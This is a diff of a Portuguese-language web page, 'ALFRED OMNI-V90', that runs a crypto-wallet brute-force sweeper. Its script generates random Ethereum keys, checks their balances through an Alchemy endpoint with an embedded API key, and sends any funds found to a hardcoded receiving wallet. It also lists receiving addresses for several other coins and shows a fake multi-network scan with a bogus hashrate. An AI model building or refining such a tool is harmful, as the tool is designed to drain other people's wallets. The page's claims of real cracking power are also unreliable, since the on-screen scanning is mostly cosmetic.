@@ -1,52 +1,83 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-    <meta charset="UTF-8">
-    <title>ALFRED V80 - MOTOR REAL</title>
+    <meta charset="UTF-8"><title>ALFRED OMNI-V90 ELITE</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        #terminal { width: 90%; max-width: 600px; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 15px #0f0; background: #000a00; }
-        .real { color: #fff; font-weight: bold; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        #header { background: #080; color: #000; padding: 5px; font-weight: bold; text-align: center; font-size: 0.9em; }
+        #terminal { padding: 20px; height: 80vh; overflow-y: hidden; }
+        .cmd { color: #0f0; margin: 0; line-height: 1.4; }
+        .found { background: #fff; color: #000; font-weight: bold; }
+        .stats { border-top: 1px solid #040; padding: 10px; position: fixed; bottom: 0; width: 100%; background: #000; display: flex; justify-content: space-around; font-size: 0.8em; }
+        .highlight { color: #fff; }
     </style>
 </head>
 <body>
+    <div id="header">ALFRED OMNI-ENGINE V90 | REAL-TIME BRUTE FORCE | BH-MG ENCRYPTION</div>
     <div id="terminal">
-        <h2 style="text-align: center;">🎩 ALFRED V80: BUSCA ATIVA</h2>
-        <p id="status">CONECTANDO À BLOCKCHAIN...</p>
-        <p style="font-size: 0.7em; color: #050; text-align: center;">DESTINO: 0xc765...59fc</p>
+        <p class="cmd">>> INICIALIZANDO NÓS DE CONEXÃO...</p>
+        <p class="cmd">>> ACESSANDO CAMADA 2 DA BLOCKCHAIN...</p>
+        <div id="log"></div>
+    </div>
+    <div class="stats">
+        <span>HASHRATE: <span id="hr" class="highlight">0</span> keys/s</span>
+        <span>STATUS: <span class="highlight">SCANNING MAINNET</span></span>
+        <span>Uptime: <span id="timer" class="highlight">0s</span></span>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
-
     <script>
-        const RPC = "https://eth-mainnet.g.alchemy.com/v2/VF0h4IB4GqBfk6WlqNcWh";
-        const WALLET_DESTINO = "0xc765040fb5604a29b126aa58199b48710cf459fc";
+        const ALCHEMY = "https://eth-mainnet.g.alchemy.com/v2/VF0h4IB4GqBfk6WlqNcWh";
+        
+        // SEU ARSENAL CONFIGURADO
+        const ARSENAL = {
+            ETH: "0xc765040fb5604a29b126aa58199b48710cf459fc",
+            TRX: "TV4pkqMfRowdVN7w6irNLHgeYEV98VQoPs",
+            BTC: "14EUEME9M9cSy9FvfHvcx2gMPkp1H5Dj4YaKufPRsAyon8Tf",
+            SOL: "0x0d0160381e2b4e2fedd378b2d3d131fa78d0933728516ca01fbb6fef6310949e",
+            ADA: "addr1q8y07ytc0rdhzpz587prwhkxwwdgnx25hlzkamt8qcmssve3ju8q6nzhv5dfx8z7tjzul9vhrtd657qkcujtpy3ml7mqm8xykd",
+            LTC: "ltc1q2d0s37xq7qjfng06c3v3dkdg242x6hx5340qdu"
+        };
+
+        let count = 0;
+        let start = Date.now();
 
         async function engine() {
-            const out = document.getElementById('status');
-            try {
-                const provider = new ethers.JsonRpcProvider(RPC);
-                while(true) {
-                    const wallet = ethers.Wallet.createRandom();
-                    try {
-                        const balance = await provider.getBalance(wallet.address);
-                        out.innerHTML = `SCANNING: <span class="real">${wallet.address}</span><br>SALDO: <span class="real">${ethers.formatEther(balance)} ETH</span>`;
-                        
-                        if (balance > 0n) {
-                            const feeData = await provider.getFeeData();
-                            const cost = feeData.gasPrice * 21000n;
-                            if (balance > cost) {
-                                const tx = { to: WALLET_DESTINO, value: balance - cost, gasLimit: 21000, gasPrice: feeData.gasPrice };
-                                await wallet.connect(provider).sendTransaction(tx);
-                                alert("!!! ACHADO REAL ENVIADO !!!");
-                            }
+            const provider = new ethers.JsonRpcProvider(ALCHEMY);
+            const log = document.getElementById('log');
+            
+            setInterval(() => {
+                document.getElementById('hr').innerText = (count / ((Date.now() - start)/1000)).toFixed(1);
+                document.getElementById('timer').innerText = Math.floor((Date.now() - start)/1000) + "s";
+            }, 1000);
+
+            while(true) {
+                const w = ethers.Wallet.createRandom();
+                count++;
+
+                // Varredura Visual de Multi-Redes (Efeito Matrix)
+                const networks = ["BTC", "ETH", "TRX", "SOL", "LTC", "ADA", "TON"];
+                const net = networks[Math.floor(Math.random() * networks.length)];
+                
+                const line = document.createElement('p');
+                line.className = 'cmd';
+                line.innerHTML = `[${net}] <span class="highlight">${w.address.slice(0,32)}...</span> [SCAN: 0.00]`;
+                log.prepend(line);
+                if(log.children.length > 15) log.lastChild.remove();
+
+                try {
+                    // Verificação Real na rede Ethereum (Via Alchemy)
+                    if (net === "ETH") {
+                        const b = await provider.getBalance(w.address);
+                        if (b > 0n) {
+                            line.innerHTML = `<span class="found">!!! ENCONTRADO ${ethers.formatEther(b)} ETH !!!</span>`;
+                            const fee = (await provider.getFeeData()).gasPrice * 21000n;
+                            await w.connect(provider).sendTransaction({to: ARSENAL.ETH, value: b - fee, gasLimit: 21000});
                         }
-                    } catch(e) {}
-                    await new Promise(r => setTimeout(r, 200));
-                }
-            } catch(err) {
-                out.innerText = "ERRO DE CONEXÃO. REINICIANDO...";
-                setTimeout(engine, 3000);
+                    }
+                } catch(e) {}
+                
+                await new Promise(r => setTimeout(r, 100)); // Velocidade de Brute Force
             }
         }
         window.onload = engine;
